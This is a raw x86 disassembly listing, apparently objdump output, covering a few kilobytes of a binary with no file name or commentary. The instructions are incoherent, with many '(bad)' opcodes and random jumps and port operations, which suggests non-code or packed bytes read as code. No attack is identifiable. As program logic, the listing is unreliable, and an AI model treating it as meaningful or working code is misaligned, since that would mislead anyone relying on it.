  418a45:	xchg   ebp,eax
  418a46:	call   0xc8820aa7
  418a4b:	xor    DWORD PTR [edx-0x62],ebx
  418a4e:	sahf   
  418a4f:	popf   
  418a50:	nop/reserved BYTE PTR [ebx+edx*1+0x3a12b8db]
  418a58:	scas   al,BYTE PTR es:[edi]
  418a59:	or     cl,al
  418a5b:	push   esi
  418a5c:	loop   0x418a67
  418a5e:	push   ebp
  418a5f:	jle    0x4189e7
  418a61:	les    ecx,FWORD PTR [esi-0x76]
  418a64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a65:	(bad)  
  418a67:	push   cs
  418a68:	sbb    eax,0xfe48a19f
  418a6d:	les    edx,FWORD PTR [ecx]
  418a6f:	test   al,0x74
  418a71:	dec    ecx
  418a72:	daa    
  418a73:	retf   0xe37d
  418a76:	(bad)  
  418a77:	or     al,0x9e
  418a79:	repnz dec ebx
  418a7b:	dec    ebx
  418a7c:	addr16 mov eax,ds:0xca1b
  418a80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a81:	pop    esp
  418a82:	imul   BYTE PTR [esi-0x2b]
  418a85:	add    BYTE PTR [ebx+0x224a12ce],dl
  418a8b:	inc    ebx
  418a8c:	mov    esp,0xb4ebfc20
  418a91:	enter  0xe933,0x9f
  418a95:	aam    0x38
  418a97:	mov    al,ds:0x392bca7e
  418a9c:	loop   0x418b00
  418a9e:	int    0x9b
  418aa0:	repz add al,0x5b
  418aa3:	dec    ecx
  418aa4:	xchg   BYTE PTR [edx+edx*4+0x655e53d7],cl
  418aab:	sbb    al,BYTE PTR [eax-0x4e2e6a81]
  418ab1:	int3   
  418ab2:	dec    esi
  418ab3:	pop    edx
  418ab4:	stc    
  418ab5:	dec    ebx
  418ab6:	add    al,0xb9
  418ab8:	cmp    ebx,DWORD PTR [ebx-0x77]
  418abb:	jle    0x418a6e
  418abd:	cmp    dl,bh
  418abf:	fiadd  WORD PTR [eax]
  418ac1:	fwait
  418ac2:	add    eax,0x1a18d469
  418ac7:	lods   eax,DWORD PTR ds:[esi]
  418ac8:	mov    esp,0xf1c9414e
  418acd:	pusha  
  418ace:	xchg   edx,eax
  418acf:	jmp    0x418b0a
  418ad1:	or     al,0x88
  418ad3:	and    eax,0xe185502a
  418ad8:	enter  0xbecc,0xc4
  418adc:	xchg   edi,eax
  418add:	imul   edi,DWORD PTR [esp+ebp*4-0x77884e1],0x71
  418ae5:	sbb    ecx,eax
  418ae7:	sbb    DWORD PTR [esi],0xabef5cd7
  418aed:	mov    ebx,0xfeabc300
  418af2:	test   BYTE PTR [edx+0x1dab64b0],bl
  418af8:	std    
  418af9:	pop    edi
  418afa:	xor    eax,0xa8b07bd
  418aff:	lahf   
  418b00:	inc    edi
  418b01:	xchg   ebx,eax
  418b02:	mov    eax,0x8d8330e8
  418b07:	outs   dx,BYTE PTR ds:[esi]
  418b08:	(bad)  
  418b09:	mov    ch,BYTE PTR [ebx+0x18]
  418b0c:	xor    ebx,DWORD PTR [eax+0x75]
  418b0f:	popa   
  418b10:	jecxz  0x418abb
  418b12:	retf   
  418b13:	push   ss
  418b14:	pop    esp
  418b15:	push   edi
  418b16:	push   edi
  418b17:	adc    bh,bh
  418b19:	int3   
  418b1a:	add    DWORD PTR [ecx],ebx
  418b1c:	repnz xor edi,0x9c0a89d8
  418b23:	xor    eax,0xba699573
  418b28:	shrd   eax,edi,0x2
  418b2c:	jmp    0x4190b6
  418b31:	xor    DWORD PTR [ecx],0xffffffd8
  418b34:	mov    eax,ds:0x19421898
  418b39:	and    ebp,DWORD PTR [ebx-0x139c8d4c]
  418b3f:	jmp    0x418af5
  418b41:	xchg   edi,eax
  418b42:	pop    ebx
  418b43:	or     al,0x16
  418b45:	cmp    eax,0x88161604
  418b4a:	pusha  
  418b4b:	mov    dl,0xe5
  418b4d:	int3   
  418b4e:	repnz push ebp
  418b50:	(bad)  
  418b51:	loopne 0x418b2e
  418b53:	ins    DWORD PTR es:[edi],dx
  418b54:	adc    eax,0x4985aead
  418b59:	push   0x6628236e
  418b5e:	sbb    BYTE PTR [edi-0x40],ah
  418b61:	dec    esp
  418b62:	fs popf 
  418b64:	cmp    bl,BYTE PTR [edi+0x3b]
  418b67:	into   
  418b68:	std    
  418b69:	sub    dh,BYTE PTR [eax]
  418b6b:	adc    edx,ecx
  418b6d:	cmp    eax,0x847b016b
  418b72:	(bad)  
  418b73:	xchg   ebp,eax
  418b74:	ss cld 
  418b76:	or     BYTE PTR [eax],cl
  418b78:	sub    ax,0x980f
  418b7c:	lds    ecx,FWORD PTR [ebp-0x301959cd]
  418b82:	jecxz  0x418b6a
  418b84:	and    DWORD PTR [edi+0x16],0x64
  418b88:	push   edi
  418b89:	mov    ds:0xc5698edb,al
  418b8e:	sbb    eax,0x269b98af
  418b93:	and    eax,0x96b59a24
  418b98:	sub    DWORD PTR [eax],esp
  418b9a:	cmp    al,0xfc
  418b9c:	sahf   
  418b9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b9e:	add    DWORD PTR [ebx-0x46],eax
  418ba1:	mov    ds:0xbadaaddc,eax
  418ba6:	inc    BYTE PTR [edi]
  418ba8:	call   0xe3eb:0xe2b9132c
  418baf:	aaa    
  418bb0:	(bad)  
  418bb1:	xchg   ebx,eax
  418bb2:	aam    0xf
  418bb4:	adc    bl,0xea
  418bb7:	stos   DWORD PTR es:[edi],eax
  418bb8:	dec    ecx
  418bb9:	rol    DWORD PTR [ecx],0xa7
  418bbc:	jnp    0x418c25
  418bbe:	adc    eax,0xab8fa413
  418bc3:	out    0x7b,al
  418bc5:	inc    ebp
  418bc6:	mov    eax,ds:0xf1545c4a
  418bcb:	lods   eax,DWORD PTR ds:[esi]
  418bcc:	adc    al,0x1f
  418bce:	das    
  418bcf:	arpl   WORD PTR [ecx],bx
  418bd1:	cmp    BYTE PTR [edi+0x6fe31857],dh
  418bd7:	scas   eax,DWORD PTR es:[edi]
  418bd8:	add    al,0x3f
  418bda:	ja     0x418c36
  418bdc:	xchg   esi,eax
  418bdd:	scas   eax,DWORD PTR es:[edi]
  418bde:	(bad)  
  418bdf:	or     al,0x97
  418be1:	xchg   ebp,eax
  418be2:	adc    eax,0x3b9554b5
  418be7:	cmp    al,0x38
  418be9:	jnp    0x418bcf
  418beb:	in     eax,dx
  418bec:	std    
  418bed:	ss push eax
  418bef:	push   edx
  418bf0:	mov    ecx,0xc8df4c6d
  418bf5:	pushf  
  418bf6:	das    
  418bf7:	out    0x8b,al
  418bf9:	jp     0x418ba3
  418bfb:	pop    ecx
  418bfc:	mov    ebp,0xa8146b12
  418c01:	ss add al,0x5b
  418c04:	les    ecx,FWORD PTR [esi+edi*4+0x34]
  418c08:	xchg   ebx,eax
  418c09:	dec    ecx
  418c0a:	cmp    bh,BYTE PTR [eax]
  418c0c:	loopne 0x418c64
  418c0e:	jg     0x418c16
  418c10:	je     0x418c46
  418c12:	mov    bh,0x0
  418c14:	aas    
  418c15:	icebp  
  418c16:	into   
  418c17:	mov    edi,esp
  418c19:	sbb    al,0x6f
  418c1b:	retf   
  418c1c:	pusha  
  418c1d:	mov    eax,0xb6e0a299
  418c22:	ins    BYTE PTR es:[edi],dx
  418c23:	add    edi,0xb56ad946
  418c29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c2a:	push   ss
  418c2b:	mov    ch,0x29
  418c2d:	int    0x41
  418c2f:	dec    edi
  418c30:	shl    ebx,cl
  418c32:	push   0x6f
  418c34:	inc    edx
  418c35:	mov    eax,0x38558d75
  418c3a:	call   0x715c21cc
  418c3f:	adc    bl,dl
  418c41:	in     al,dx
  418c42:	lds    edi,FWORD PTR [esi+0x1c]
  418c45:	sub    ebp,edi
  418c47:	shl    DWORD PTR [ecx],1
  418c49:	xor    edi,esi
  418c4b:	mov    ebp,eax
  418c4d:	pop    es
  418c4e:	ss je  0x418cb6
  418c51:	das    
  418c52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c53:	add    DWORD PTR [ecx],edi
  418c55:	cmp    eax,0xbbbf1aa3
  418c5a:	mov    eax,0x7f40431c
  418c5f:	and    DWORD PTR [ebx-0x43],esi
  418c62:	xor    BYTE PTR [edx+0x66],cl
  418c65:	mov    dl,0xcd
  418c67:	pushf  
  418c68:	pop    ss
  418c69:	aad    0x18
  418c6b:	test   al,0x72
  418c6d:	(bad)  
  418c6f:	cwde   
  418c70:	jecxz  0x418c0f
  418c72:	cmp    ch,BYTE PTR [ebx-0x6]
  418c75:	mov    dl,0x12
  418c77:	call   0xd2c4dd41
  418c7c:	ja     0x418c4b
  418c7e:	out    dx,al
  418c7f:	out    0xe1,eax
  418c81:	xor    ecx,ebx
  418c83:	push   0x5bf7e03f
  418c88:	inc    ecx
  418c89:	test   ah,al
  418c8b:	pop    esi
  418c8c:	jmp    0x99df07df
  418c91:	sub    DWORD PTR [ebx-0x37b22181],ebp
  418c97:	call   0xdf7b:0x9b6b9c16
  418c9e:	mov    al,0x83
  418ca0:	xor    ah,BYTE PTR [edx-0x6878d6d5]
  418ca6:	loope  0x418c45
  418ca8:	int    0xaa
  418caa:	ins    DWORD PTR es:[edi],dx
  418cab:	mov    cl,0xd8
  418cad:	mov    cl,0x2
  418caf:	jmp    FWORD PTR [ebp+0xf9682b7]
  418cb5:	mov    ebp,0x74e56035
  418cba:	mov    eax,ds:0x5dd7b722
  418cbf:	or     BYTE PTR [edx],dl
  418cc1:	pop    esp
  418cc2:	daa    
  418cc3:	xor    eax,edx
  418cc5:	in     al,dx
  418cc6:	out    0x4c,eax
  418cc8:	inc    ecx
  418cc9:	int3   
  418cca:	fmul   DWORD PTR [ebx]
  418ccc:	sbb    DWORD PTR [esi],esi
  418cce:	add    eax,0xc5688a9d
  418cd3:	sbb    BYTE PTR [edi],dl
  418cd5:	add    bh,BYTE PTR cs:[ebp-0x36]
  418cd9:	jecxz  0x418d14
  418cdb:	and    BYTE PTR [ecx-0x82f324b],cl
  418ce1:	mov    al,0xd5
  418ce3:	adc    al,0x9
  418ce5:	jnp    0x418d1b
  418ce7:	push   esi
  418ce8:	cld    
  418ce9:	imul   BYTE PTR [ebx-0x35]
  418cec:	push   ecx
  418ced:	sbb    al,0x96
  418cef:	clc    
  418cf0:	retf   
  418cf1:	cmc    
  418cf2:	jb     0x418d60
  418cf4:	and    ah,BYTE PTR [esi]
  418cf6:	sahf   
  418cf7:	cmp    BYTE PTR [edi+esi*1-0x15],ch
  418cfb:	mov    ch,BYTE PTR [edx-0x5]
  418cfe:	cmp    al,BYTE PTR [eax-0x6e]
  418d01:	xchg   ebx,esi
  418d03:	mov    edx,0x1d651f23
  418d08:	inc    ebp
  418d09:	mov    edi,0x52791304
  418d0e:	jo     0x418d11
  418d10:	neg    BYTE PTR [ebx-0x3e]
  418d13:	lds    ecx,FWORD PTR [ebx+0xa]
  418d16:	pusha  
  418d17:	ins    DWORD PTR es:[edi],dx
  418d18:	shl    DWORD PTR [edi+0x1d],0xd9
  418d1c:	jae    0x418d19
  418d1e:	xchg   cl,dl
  418d20:	mov    ecx,0xdd757192
  418d25:	cmp    DWORD PTR [ebx+0x2],eax
  418d28:	outs   dx,DWORD PTR ds:[esi]
  418d29:	(bad)  
  418d2a:	xor    bl,BYTE PTR [ebx+0x2544206d]
  418d30:	dec    edi
  418d31:	and    edx,DWORD PTR [edi-0x1c9f0ffa]
  418d37:	sti    
  418d38:	push   edi
  418d39:	lahf   
  418d3a:	dec    edx
  418d3b:	and    eax,0xcad09955
  418d40:	pop    edx
  418d41:	ins    BYTE PTR es:[edi],dx
  418d42:	ret    0x6214
  418d45:	xchg   edi,eax
  418d46:	pop    edx
  418d47:	and    DWORD PTR [ecx],eax
  418d49:	and    bh,BYTE PTR ds:0x87aabd50
  418d4f:	scas   eax,DWORD PTR es:[edi]
  418d50:	mov    ebx,0x6f1f8084
  418d55:	inc    eax
  418d56:	je     0x418d52
  418d58:	test   DWORD PTR [ebp+0x14],0xe7874861
  418d5f:	push   ecx
  418d60:	dec    esp
  418d61:	and    eax,0x419491d0
  418d66:	cmp    eax,0x8571b072
  418d6b:	cmp    esi,DWORD PTR [eax+0x40]
  418d6e:	push   ebp
  418d6f:	arpl   WORD PTR [ecx+0x3adb1f41],bp
  418d75:	call   0xdf8c:0xf4a69420
  418d7c:	mov    eax,0x621af813
  418d81:	fild   DWORD PTR [edi+0x41]
  418d84:	rol    BYTE PTR [edx+ebx*8-0x4b79414d],cl
  418d8b:	xchg   esp,eax
  418d8c:	pusha  
  418d8d:	pushf  
  418d8e:	cmp    eax,0x8d2e0785
  418d93:	mov    ch,0x67
  418d95:	out    0xc8,eax
  418d97:	icebp  
  418d98:	and    esp,DWORD PTR [esi]
  418d9a:	rcr    BYTE PTR [edi+0x10],1
  418d9d:	in     eax,dx
  418d9e:	and    ch,BYTE PTR [edi-0x14]
  418da1:	mov    bl,0x9c
  418da3:	inc    edi
  418da4:	sub    ecx,esp
  418da6:	xor    al,0xfb
  418da8:	push   esi
  418da9:	pushf  
  418daa:	aad    0xb2
  418dac:	mov    ds,WORD PTR [ecx-0x80]
  418daf:	aas    
  418db0:	jge    0x4bc3ae7a
  418db6:	popf   
  418db7:	popa   
  418db8:	add    eax,0x8ab474a8
  418dbd:	pop    es
  418dbe:	ins    BYTE PTR es:[edi],dx
  418dbf:	pop    esp
  418dc0:	leave  
  418dc1:	(bad)  
  418dc2:	in     eax,dx
  418dc3:	out    0x4c,al
  418dc5:	clc    
  418dc6:	retf   
  418dc7:	jge    0x418d85
  418dc9:	xchg   edi,eax
  418dca:	test   dl,0x42
  418dcd:	fidiv  DWORD PTR [esi]
  418dcf:	jge    0x418d8a
  418dd1:	pop    ds
  418dd2:	adc    edi,edx
  418dd4:	rcl    DWORD PTR [ebx+edi*2],0x1
  418dd8:	xchg   ecx,eax
  418dd9:	push   ecx
  418dda:	outs   dx,BYTE PTR ds:[esi]
  418ddb:	fiadd  DWORD PTR [esi-0x7e]
  418dde:	xor    DWORD PTR ds:0xa33e385b,eax
  418de4:	jns    0x418d6c
  418de6:	push   ebx
  418de7:	daa    
  418de8:	lea    esp,[ecx]
  418dea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418deb:	adc    BYTE PTR [eax+0x74],cl
  418dee:	outs   dx,BYTE PTR ds:[esi]
  418def:	lods   al,BYTE PTR ds:[esi]
  418df0:	mov    al,0xa8
  418df2:	loope  0x418e5f
  418df4:	retf   
  418df5:	dec    ebp
  418df6:	mov    dh,0xd9
  418df8:	cmp    al,0xca
  418dfa:	mov    esi,0xa4a1b899
  418dff:	xchg   ebp,eax
  418e00:	aas    
  418e01:	in     al,dx
  418e02:	pop    ebx
  418e03:	jb     0x418dbc
  418e05:	rol    ecx,cl
  418e07:	aam    0xb3
  418e09:	clc    
  418e0a:	ja     0x418da7
  418e0c:	adc    DWORD PTR [edx+0x6d84ef42],ecx
  418e12:	(bad)  
  418e13:	cmp    DWORD PTR [ecx+ebp*2],eax
  418e16:	retf   0x8eb8
  418e19:	sub    eax,DWORD PTR [eax+0x4f4f5788]
  418e1f:	cmp    ah,BYTE PTR [eax]
  418e21:	leave  
  418e22:	jns    0x418deb
  418e24:	jmp    0x418e80
  418e26:	jmp    0x418e4d
  418e28:	gs mov ebx,0x7a65e527
  418e2e:	fld    TBYTE PTR [ebx]
  418e30:	in     eax,0x80
  418e32:	loop   0x418dc0
  418e34:	aas    
  418e35:	inc    edi
  418e36:	or     al,0xb9
  418e38:	fwait
  418e39:	xlat   BYTE PTR ds:[ebx]
  418e3a:	mov    edx,0xb1f6cd17
  418e3f:	adc    al,BYTE PTR [edx]
  418e41:	dec    ebx
  418e42:	mov    esi,0x22d3c045
  418e47:	xor    BYTE PTR [eax],ah
  418e49:	fs mov edx,0x1672207
  418e4f:	lock ss xor al,0xf2
  418e53:	int    0x7d
  418e55:	mov    dh,ch
  418e57:	mov    ss,WORD PTR [eax]
  418e59:	jo     0x418df9
  418e5b:	loope  0x418e33
  418e5d:	dec    esp
  418e5e:	inc    eax
  418e5f:	xrelease xchg BYTE PTR [ebp-0x3c],bh
  418e63:	cmp    BYTE PTR [ebx+0x6c],ah
  418e66:	jnp    0x418e53
  418e68:	mov    cl,0xd7
  418e6a:	lods   eax,DWORD PTR ds:[esi]
  418e6b:	xchg   edx,eax
  418e6c:	xor    ecx,edx
  418e6e:	ret    0xf977
  418e71:	jp     0x418ea7
  418e73:	dec    ebx
  418e74:	jecxz  0x418e4d
  418e76:	outs   dx,BYTE PTR ds:[esi]
  418e77:	ds stc 
  418e79:	pop    es
  418e7a:	push   0xa955e6d8
  418e7f:	inc    eax
  418e80:	inc    esp
  418e81:	outs   dx,DWORD PTR ds:[esi]
  418e82:	mov    ch,0x9c
  418e84:	mov    edx,0xd560caa5
  418e89:	pop    esi
  418e8a:	or     BYTE PTR [ecx+0x42],dh
  418e8d:	hlt    
  418e8e:	lds    ebp,FWORD PTR [edx-0x3]
  418e91:	and    eax,0xc666ad8f
  418e96:	jno    0x418e5b
  418e98:	jle    0x418ec4
  418e9a:	test   BYTE PTR [ecx-0x2f6cfc40],ah
  418ea0:	and    dh,dl
  418ea2:	sbb    eax,0xbb77155c
  418ea7:	fcomp  DWORD PTR [ebp+0x30]
  418eaa:	xchg   edx,eax
  418eab:	mov    WORD PTR [edx+0x31],ss
  418eae:	mov    dl,0xd7
  418eb0:	inc    esp
  418eb1:	mov    esp,0xb951a449
  418eb6:	pop    eax
  418eb7:	jmp    0x418e44
  418eb9:	sar    BYTE PTR [ecx+0x68],1
  418ebc:	add    eax,0x509888b9
  418ec1:	cmp    edx,DWORD PTR [esi+0x6c]
  418ec4:	cmc    
  418ec5:	sahf   
  418ec6:	cmovns edx,DWORD PTR [eax-0x3b2bd02e]
  418ecd:	adc    ebp,DWORD PTR [edi-0x10]
  418ed0:	sbb    DWORD PTR [edi+0x7736fe07],esp
  418ed6:	mov    cl,0x3c
  418ed8:	ja     0x418f2a
  418eda:	mov    ebp,0x1b3b2f31
  418edf:	iret   
  418ee0:	sub    al,0xc
  418ee2:	loop   0x418ebf
  418ee4:	xor    eax,0x9ee0bb86
  418ee9:	push   edi
  418eea:	mov    bh,0xdd
  418eec:	inc    edx
  418eed:	pop    eax
  418eee:	ud2    
  418ef0:	lods   eax,DWORD PTR ds:[esi]
  418ef1:	fisub  DWORD PTR [ebp+0x7a]
  418ef4:	sti    
  418ef5:	adc    al,0x44
  418ef7:	je     0x418f36
  418ef9:	into   
  418efa:	push   ss
  418efb:	sbb    eax,0x15f10c29
  418f00:	push   edx
  418f01:	pop    ebp
  418f02:	fstp   QWORD PTR [esi-0x825db8f]
  418f08:	mov    ?,WORD PTR [ecx]
  418f0a:	mov    ds:0xb62a7f4c,eax
  418f0f:	aaa    
  418f10:	pop    ebp
  418f11:	xchg   esp,eax
  418f12:	push   edi
  418f13:	sbb    dh,cl
  418f15:	sub    BYTE PTR [edx],dh
  418f17:	lock mov ah,0xfa
  418f1a:	jbe    0x418ed6
  418f1c:	imul   edi,edx,0xffffffa3
  418f1f:	aam    0x83
  418f21:	nop
  418f22:	(bad)  
  418f23:	int    0xf7
  418f25:	cmp    cl,BYTE PTR [esi]
  418f27:	(bad)  
  418f28:	leave  
  418f29:	cli    
  418f2a:	and    al,0xde
  418f2c:	add    eax,0xd057a482
  418f31:	jns    0x418f2d
  418f33:	mov    es,WORD PTR [edi+ebx*4+0xede7275]
  418f3a:	inc    edi
  418f3b:	push   eax
  418f3c:	lods   al,BYTE PTR ds:[esi]
  418f3d:	int3   
  418f3e:	sbb    eax,0x78dfe226
  418f43:	mov    bh,0xec
  418f45:	mov    bh,0xfe
  418f47:	loopne 0x418f6b
  418f49:	test   DWORD PTR [edi+0x11d6cefd],edx
  418f4f:	add    ch,BYTE PTR [edx+edi*1]
  418f52:	add    dl,0x54
  418f55:	sbb    al,BYTE PTR cs:[esi]
  418f58:	and    BYTE PTR [eax+ebp*2],ah
  418f5b:	mov    eax,ds:0xa730ef26
  418f60:	out    dx,al
  418f61:	xor    bl,BYTE PTR [ecx+0x46a6523e]
  418f67:	adc    BYTE PTR [ecx],0x42
  418f6a:	test   al,0xda
  418f6c:	cmp    esi,DWORD PTR [ebp+0x45c7e396]
  418f72:	int3   
  418f73:	ins    DWORD PTR es:[edi],dx
  418f74:	mov    esp,0xe901d7b7
  418f79:	retf   0x7d5f
  418f7c:	mov    ds:0x43c9f4f,eax
  418f81:	imul   edi,DWORD PTR [ecx+0x6e6c07fe],0x68
  418f88:	mov    dh,0x93
  418f8a:	xor    edx,ebp
  418f8c:	sub    al,0x92
  418f8f:	xor    bh,dl
  418f91:	fiadd  DWORD PTR [esi+0x11cf3095]
  418f97:	xor    esp,edx
  418f99:	ror    BYTE PTR [ecx-0x7783c73],1
  418f9f:	xor    BYTE PTR [ebp-0x38],al
  418fa2:	imul   ebx,DWORD PTR [ebp+eiz*4+0x1b],0x62
  418fa7:	sbb    al,0x9a
  418fa9:	jg     0x418f64
  418fab:	jns    0x418f31
  418fad:	push   cs
  418fae:	fistp  DWORD PTR [eax+0x36]
  418fb1:	mov    ebp,0x42ce255e
  418fb6:	arpl   WORD PTR [esi],cx
  418fb8:	dec    ecx
  418fb9:	push   edi
  418fba:	xor    al,0xe7
  418fbc:	xor    esi,DWORD PTR [edx+0x50]
  418fbf:	ficomp DWORD PTR [ecx+0x421d7509]
  418fc5:	cli    
  418fc6:	ror    DWORD PTR [edi-0x6710685b],1
  418fcc:	sub    eax,DWORD PTR [eax+0x5ed5b832]
  418fd2:	mov    ah,0x56
  418fd4:	test   DWORD PTR [ecx+0x7d0361b],eax
  418fda:	mov    ecx,0x852b732a
  418fdf:	shl    ebp,cl
  418fe1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418fe2:	shl    cl,0x3e
  418fe5:	(bad)
  418fe8:	out    0xf9,eax
  418fea:	mov    dh,0x60
  418fec:	lds    edi,FWORD PTR [ebx-0x24]
  418fef:	jg     0x418fb5
  418ff1:	icebp  
  418ff2:	add    ecx,DWORD PTR [esi+0x659f6b7d]
  418ff8:	fstp   TBYTE PTR [edi]
  418ffa:	mov    eax,ds:0xe8bba7ec
  418fff:	lods   al,BYTE PTR ds:[esi]
  419000:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419001:	add    ebx,DWORD PTR [eax+0x490688d9]
  419007:	daa    
  419008:	jo     0x418fef
  41900a:	dec    eax
  41900b:	add    ecx,edi
  41900d:	lahf   
  41900e:	ins    DWORD PTR es:[edi],dx
  41900f:	loope  0x418f9d
  419011:	jecxz  0x419080
  419013:	jle    0x419000
  419015:	nop
  419016:	shr    edx,0x16
  419019:	fild   QWORD PTR [edi]
  41901b:	scas   al,BYTE PTR es:[edi]
  41901c:	mov    ah,0xb0
  41901e:	div    bh
  419020:	sub    dl,BYTE PTR [esi+ebx*1]
  419023:	xor    BYTE PTR [ebp-0x570f2750],al
  419029:	xchg   DWORD PTR [ebp+0x3],edx
  41902c:	cmp    al,al
  41902e:	inc    esi
  41902f:	rcr    DWORD PTR [eax-0x1a],0xe2
  419033:	ja     0x418fbf
  419035:	add    al,bl
  419037:	stc    
  419038:	(bad)  
  419039:	frstor [edi+ebp*8-0x523fb89e]
  419040:	xchg   esi,eax
  419041:	jge    0x41906e
  419043:	xchg   ecx,eax
  419044:	sub    edi,ebp
  419046:	push   edi
  419047:	sbb    al,0xdb
  419049:	ret    
  41904a:	aad    0x23
  41904c:	ret    0xf2e5
  41904f:	lods   eax,DWORD PTR ds:[esi]
  419050:	mov    dl,0xd7
  419052:	adc    al,0xb6
  419054:	jns    0x4190c6
  419056:	repz or BYTE PTR [eax],ch
  419059:	add    ebx,DWORD PTR [ecx-0x5103281b]
  41905f:	mov    ch,0x73
  419061:	in     al,dx
  419062:	jge    0x418ff3
  419064:	ficomp WORD PTR [eax-0x5a]
  419067:	jo     0x41903e
  419069:	mov    dh,0x11
  41906b:	add    BYTE PTR [ebx],bh
  41906d:	cmp    eax,0x6c28c21f
  419072:	fadd   st,st(5)
  419074:	shr    BYTE PTR [ecx+ebp*2-0x2a],0xa
  419079:	cwde   
  41907a:	mov    DWORD PTR [ecx],eax
  41907c:	lods   al,BYTE PTR ds:[esi]
  41907d:	xor    BYTE PTR ds:0x98d44441,ah
  419083:	mov    ch,BYTE PTR [esi+0x7b7381f5]
  419089:	mov    edx,0xedcb5107
  41908e:	fcmovu st,st(6)
  419090:	push   ebp
  419091:	stos   DWORD PTR es:[edi],eax
  419092:	pop    esp
  419093:	pop    eax
  419094:	test   eax,0x7a4b52ff
  419099:	cmp    dl,BYTE PTR [eax]
  41909b:	adc    eax,0x3f576a84
  4190a0:	cdq    
  4190a1:	mov    al,gs:0xf4323111
  4190a7:	hlt    
  4190a8:	scas   al,BYTE PTR es:[edi]
  4190a9:	in     al,0x9a
  4190ab:	inc    edi
  4190ac:	fld    TBYTE PTR [ebx]
  4190ae:	pop    ds
  4190af:	sub    BYTE PTR [eax-0x37],ch
  4190b2:	lds    esp,FWORD PTR [ebp-0x29]
  4190b5:	aas    
  4190b6:	xor    ecx,ecx
  4190b8:	shr    edi,0x2
  4190bb:	or     edi,DWORD PTR [ebp+0x14]
  4190be:	or     eax,ecx
  4190c0:	cmp    edx,eax
  4190c2:	jne    0x41965b
  4190c8:	cmp    DWORD PTR [ebp+0xc],edi
  4190cb:	jmp    0x419655
  4190d0:	arpl   WORD PTR [edi+0x1f],di
  4190d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4190d4:	adc    esp,DWORD PTR [esi+0x24f3262]
  4190da:	xchg   esi,eax
  4190db:	outs   dx,BYTE PTR ds:[esi]
  4190dc:	push   ds
  4190dd:	push   ebx
  4190de:	in     eax,dx
  4190df:	mov    ah,0xbc
  4190e1:	pop    ecx
  4190e2:	or     al,0x16
  4190e4:	cmp    eax,0x39161604
  4190e9:	inc    esp
  4190ea:	shl    ch,1
  4190ec:	pop    ecx
  4190ed:	arpl   WORD PTR [edi+0x68dcc9f4],sp
  4190f3:	arpl   WORD PTR [esi+0x21],si
  4190f6:	icebp  
  4190f7:	xor    DWORD PTR [eax-0x6915115f],esp
  4190fd:	ss xchg esp,eax
  4190ff:	adc    BYTE PTR [edx-0x7dc76ef7],0xa
  419106:	cld    
  419107:	pop    esp
  419108:	mov    ecx,0x6f9af167
  41910d:	add    ebp,eax
  41910f:	stos   DWORD PTR es:[edi],eax
  419110:	imul   ecx,DWORD PTR [edx+ebp*4+0x71a361ce],0x250ee425
  41911b:	pop    esp
  41911c:	div    cl
  41911e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41911f:	xor    eax,0x272376b3
  419124:	mov    DWORD PTR [ebp-0x2a],edx
  419127:	ss out dx,eax
  419129:	adc    ecx,DWORD PTR [esi+edi*4-0x603af0ab]
  419130:	cmp    DWORD PTR [edx-0x63],ebx
  419133:	cwde   
  419134:	adc    ebx,DWORD PTR [ebp+0x3dec0e74]
  41913a:	pop    bp
  41913c:	pop    ecx
  41913d:	in     al,dx
  41913e:	adc    eax,0x7b93f3b0
  419143:	hlt    
  419144:	aaa    
  419145:	dec    esp
  419146:	pushf  
  419147:	nop
  419148:	leave  
  419149:	mov    BYTE PTR [eax],dh
  41914b:	push   eax
  41914c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41914d:	bts    DWORD PTR [ebp+0x6b88c21b],ebx
  419154:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419155:	in     al,dx
  419156:	sub    DWORD PTR [edx+0xe],eax
  419159:	cmp    cl,BYTE PTR [esi+ecx*1]
  41915c:	mov    cl,0x2b
  41915e:	fst    QWORD PTR [edx+edi*1-0xcb5e273]
  419165:	xchg   ebx,eax
  419166:	in     eax,dx
  419167:	and    esi,ecx
  419169:	jb     0x419138
  41916b:	pop    edi
  41916c:	(bad)  
  41916d:	ds mov al,0xce
  419170:	std    
  419171:	or     ah,BYTE PTR [ebp+0x3b]
  419174:	xchg   ecx,eax
  419175:	mov    DWORD PTR [ebp-0x2d],ebx
  419178:	jle    0x419121
  41917a:	repz xor esp,ebp
  41917d:	fldlg2 
  41917f:	in     al,dx
  419180:	fistp  QWORD PTR [edi+0x5a97476a]
  419186:	sbb    BYTE PTR [ecx+esi*2-0x65],bl
  41918a:	xor    edi,DWORD PTR [eax+0x45fcb71f]
  419190:	jmp    0xf780:0x9373505f
  419197:	add    dl,BYTE PTR [esi+0x1dce54c9]
  41919d:	imul   eax,esp,0xffffffb9
  4191a0:	jae    0x41918b
  4191a2:	push   esp
  4191a3:	mov    eax,0x8f16bfb8
  4191a8:	das    
  4191a9:	out    dx,al
  4191aa:	test   DWORD PTR [edx-0x7886c22],ebp
  4191b0:	(bad)  
  4191b1:	or     eax,0xd5097341
  4191b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4191b7:	or     BYTE PTR [ebx-0x40452fac],dl
  4191bd:	jns    0x419203
  4191bf:	xchg   esi,eax
  4191c0:	lods   eax,DWORD PTR ds:[esi]
  4191c1:	popa   
  4191c2:	add    BYTE PTR [ebx+0x6b],0xb7
  4191c6:	jge    0x4191dd
  4191c8:	mov    bh,0xf1
  4191ca:	inc    esi
  4191cb:	xchg   esi,eax
  4191cc:	(bad)  
  4191cd:	xlat   BYTE PTR ds:[ebx]
  4191ce:	repz test BYTE PTR [ebp+0x4c],0xe5
  4191d3:	and    eax,0xaf508bbc
  4191d8:	int3   
  4191d9:	fwait
  4191da:	xor    DWORD PTR [ebx],edi
  4191dc:	dec    edi
  4191dd:	xchg   ecx,eax
  4191de:	ins    BYTE PTR es:[edi],dx
  4191df:	jle    0x4191da
  4191e1:	popa   
